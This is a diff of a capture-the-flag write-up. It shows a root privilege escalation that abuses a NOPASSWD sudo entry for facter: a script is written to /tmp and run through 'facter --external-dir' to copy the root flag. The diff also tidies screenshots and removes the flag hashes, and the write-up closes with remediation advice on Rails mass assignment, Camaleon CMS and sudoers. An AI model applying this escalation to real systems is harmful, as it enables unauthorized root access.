@@ -169,6 +169,7 @@ Immediately after landing an active shell session, we checked our user's system 
 ```bash
 sudo -l
 ```
+<img width="1227" height="103" alt="Screenshot 2026-05-13 222353" src="https://github.com/user-attachments/assets/6e44fb30-3b8b-4913-83e0-1cf98058e09c" />
 
 ### Exploiting Facter via External Directories
 Direct environment manipulation via variables like FACTERLIB was blocked by security controls. However, the facter binary supports parsing and running external automation scripts from custom paths using the --external-dir argument.
@@ -179,35 +180,38 @@ Because any script inside that targeted path would be evaluated under root privi
 echo -e '#!/bin/bash\ncp /root/root.txt /tmp/root_flag.txt\nchmod 777 /tmp/root_flag.txt' > /tmp/exploit.sh
 chmod +x /tmp/exploit.sh
 ```
-<img width="579" height="33" alt="Screenshot 2026-05-13 163913" src="https://github.com/user-attachments/assets/56d5a144-c566-4392-b802-92eb7c465845" />
+<img width="1219" height="42" alt="Screenshot 2026-05-13 222802" src="https://github.com/user-attachments/assets/7e610615-6ad6-4f8c-b525-461418f745a4" />
+
 
 We then invoked the facter binary to execute our script file under administrative root authority:
 
 ```bash
 sudo /usr/bin/facter --external-dir /tmp
-Capturing the Flags
 ```
+<img width="577" height="29" alt="Screenshot 2026-05-13 222606" src="https://github.com/user-attachments/assets/e0fe8dff-8522-4665-ad7c-63379d1d248e" />
 
 The custom payload script was parsed and executed successfully by the root system process. We were then able to display the user flag from William's home folder and retrieve our final target administrative flag:
 
-``Bash
+```Bash
 cat /home/william/user.txt
+```
+<img width="522" height="37" alt="Screenshot 2026-05-13 222121" src="https://github.com/user-attachments/assets/b2755f46-b1e0-4937-9e81-2d8fa0be5d51" />
+
+
+```bash
 cat /tmp/root_flag.txt
-``
-<img width="579" height="33" alt="Screenshot 2026-05-13 163913" src="https://github.com/user-attachments/assets/2d233917-c542-4494-a03b-3f57c94d02d3" />
+```
+<img width="697" height="38" alt="Screenshot 2026-05-13 222542" src="https://github.com/user-attachments/assets/205bc4d9-2646-4759-bd34-b0b9445c3b0c" />
 
 
 
-User Flag: a9b8546a534fee6f2a9692864d63f199
-
-Root Flag: 64e29fdb53d3d63b2762a4d3393be6db
 
 ### 5. Conclusion & Remediation
 Disable Mass Assignment Vulnerabilities: Adjust the Ruby on Rails controllers to use strong parameters, filtering out unauthorized request adjustments (such as dropping direct form inputs aimed at user[role]).
 
-Patch Camaleon CMS: Upgrade the local web application instance to a secure branch to fix the underlying unauthenticated arbitrary file disclosure vulnerability.
+### Patch Camaleon CMS: Upgrade the local web application instance to a secure branch to fix the underlying unauthenticated arbitrary file disclosure vulnerability.
 
-Restrict Sudo Privileges: Remove loose NOPASSWD entries from the system /etc/sudoers configuration for binaries like facter that allow arbitrary script or plugin execution.
+### Restrict Sudo Privileges: Remove loose NOPASSWD entries from the system /etc/sudoers configuration for binaries like facter that allow arbitrary script or plugin execution.
 
 
 
